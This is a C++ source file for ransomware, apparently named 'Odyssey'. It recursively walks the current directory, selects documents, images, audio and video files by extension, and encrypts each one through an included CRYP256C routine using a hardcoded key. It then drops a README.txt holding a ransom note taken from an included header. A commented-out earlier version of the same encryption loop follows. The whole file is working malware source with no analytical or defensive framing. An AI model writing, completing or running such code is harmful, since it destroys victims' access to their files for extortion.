#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <iomanip>
#include <sstream>
#include <cstdlib>
#include <algorithm>
#include <bitset>
#include <filesystem>
#include <algorithm>
#include <cctype>
#include <thread>

#include "CRYP256C.h"
#include "RansomWareNote.h"



char key[] = "0923674598076234598672345";

std::string TargetFiles[] = {
    ".pdf",
    ".xls",
    ".ppt",
    ".doc",
    ".accd",
    ".rtf",
    ".txt",
    ".py",
    ".csv",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".avi",
    ".midi",
    ".mov",
    ".mp3",
    ".mp4",
    ".mpeg",
    ".mpeg2",
    ".mpeg3",
    ".mpg",
    ".mkv",
    ".ogg"
};


namespace fs = std::filesystem;


namespace Odyssey {
    bool end_with(std::string full_path) {
        std::transform(full_path.begin(), full_path.end(), full_path.begin(), [](unsigned char c) { return std::tolower(c); });
        std::cout << full_path << std::endl;

        for (int i = 0; i < 23; i++) {
            if (full_path.size() >= TargetFiles[i].size() &&
                full_path.compare(full_path.size() - TargetFiles[i].size(), TargetFiles[i].size(), TargetFiles[i]) == 0) {

                return true;
            }
        }

        return false;
    }

    void start_thread(std::string full_path) {
        CRYP256C().start(full_path, key);
    }

    void Start() {
        for (const auto& entry : fs::recursive_directory_iterator(".")) {
            if (fs::is_regular_file(entry.status())) {
                std::string full_path = entry.path().string();

                if (end_with(full_path)) {
                    start_thread(full_path);
                }
            }
        }
    }

    void MakeReadMeFile() {
        std::ofstream outfile("README.txt");
        outfile << RansomWareNote << std::endl;
    }
}


int main() {
    Odyssey::Start();
    Odyssey::MakeReadMeFile();

    // std::cout << RansomWareNote << std::endl;

    return 0;
}












/*std::string Ex[] = {
    ".pdf",
    ".xls",
    ".ppt",
    ".doc",
    ".accd",
    ".rtf",
    ".txt",
    ".py",
    ".csv",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".avi",
    ".midi",
    ".mov",
    ".mp3",
    ".mp4",
    ".mpeg",
    ".mpeg2",
    ".mpeg3",
    ".mpg",
    ".mkv",
    ".ogg"
};


char key[] = "0923674598076234598672345";

namespace fs = std::filesystem;

bool end_with(std::string full_path) {
    for (int i = 0; i < 23; i++) {
        if (full_path.size() >= Ex[i].size() &&
            full_path.compare(full_path.size() - Ex[i].size(), Ex[i].size(), Ex[i]) == 0) {
            
            return true;
        }
    }
    
    return false;
}

int main() {
    
    for (const auto& entry : fs::recursive_directory_iterator(".")) {
        if (fs::is_regular_file(entry.status())) {
            std::string full_path = entry.path().string();

            if (end_with(full_path)) {
                CRYP256C().start(full_path, key);
            }
        }
    }

    return 0;
}
*/